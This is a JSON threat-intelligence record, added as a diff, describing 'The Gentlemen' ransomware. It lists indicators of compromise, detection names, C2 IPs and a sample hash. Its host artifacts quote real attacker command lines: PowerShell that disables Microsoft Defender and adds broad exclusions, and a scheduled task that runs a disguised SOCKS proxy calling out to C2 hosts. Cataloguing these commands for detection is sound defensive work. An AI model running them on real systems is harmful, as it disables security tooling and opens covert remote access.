@@ -1,0 +1,258 @@
+{
+  "malware_family": "The Gentlemen",
+  "threat_actor": "The Gentlemen affiliates",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "The Gentlemen is a RaaS operation observed using scheduled tasks for execution and persistence. Affiliates use PowerShell to disable Microsoft Defender and add broad exclusions before deploying the encryptor. Post-compromise, they clear Security, System, and Application event logs and may establish persistence via a SOCKS proxy client.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "C:\\Users\\...\\Documents\\win.exe --password REDACTED --T 200 --superfast",
+      "context": "Execution of the ransomware encryptor from user's Documents folder.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled",
+      "context": "Parent: unknown. Disables Defender realtime monitoring and the WinDefend service.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled -Force",
+      "context": "Parent: unknown. Disables Defender's Controlled Folder Access feature.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command Add-MpPreference -ExclusionProcess C:\\Users\\[REDACTED]\\downloads\\G_hlm7jj_windows_amd64.exe -Force",
+      "context": "Parent: unknown. Adds an exclusion for the ransomware executable.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command Add-MpPreference -ExclusionPath C:\\ -Force",
+      "context": "Parent: unknown. Adds a broad exclusion for the entire C: drive.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /C schtasks /create /tn WindowsConnSvc /tr C:\\Windows\\Temp\\svchost32.exe client 77.110.122.137:37182 R:1085:socks /sc minute /mo 2 /ru SYSTEM /f > C:\\Windows\\Temp\\RbHoNVNU.tmp 2>&1",
+      "context": "Creates a persistent scheduled task for SOCKS proxy, running every two minutes.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\Temp\\svchost32.exe client 193.233.202.17:44729 R:1081:socks",
+      "context": "Parent: Task Scheduler. Execution of the SOCKS proxy client for C2.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "win.exe",
+      "context": "Encryptor payload name from first incident.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "G_hlm7jj_windows_amd64.exe",
+      "context": "Encryptor payload name from second incident.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "svchost32.exe",
+      "context": "SOCKS proxy client masquerading as svchost.exe in Temp folder.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\RbHoNVNU.tmp",
+      "context": "Temporary file to redirect schtasks command output.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "README-GENTLEMEN.txt",
+      "context": "Ransom note file name.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".fjn1jw",
+      "context": "Encrypted file extension from the first incident.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "WindowsConnSvc",
+      "context": "Task name for SOCKS proxy persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "CcmExec.exe > win.exe",
+      "context": "SCCM client executing the ransomware payload from the NETLOGON share.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Ransom:Win64/Gentlemen.SH!MTB",
+      "context": "Microsoft Defender detection name for Gentlemen ransomware.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Trojan:Win32/MpTamperBulkExcl.H",
+      "context": "Microsoft Defender detection for PowerShell script tampering with AV exclusions.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Ransom:Win64/BlackByte.SZ!MTB",
+      "context": "Microsoft Defender detection for the win.exe payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "WIN-8OA3CCQAE4D",
+      "context": "Malicious source workstation name for RDP activity.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Security event log cleared",
+      "context": "Indicated by Event ID 1102.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "System event log cleared",
+      "context": "Indicated by Event ID 104.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Application event log cleared",
+      "context": "Indicated by Event ID 104.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "193.233.202.17",
+      "context": "C2 IP address for SOCKS proxy on port 44729.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "77.110.122.137",
+      "context": "C2 IP address for SOCKS proxy on port 37182.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "f918535f974591ef031bd0f30a8171e3da27a6754e6426a8ba095f83195661c8",
+      "description": "Encryptor payload (G_hlm7jj_windows_amd64.exe) from second incident."
+    }
+  ],
+  "file_types": [
+    "pe"
+  ]
+}
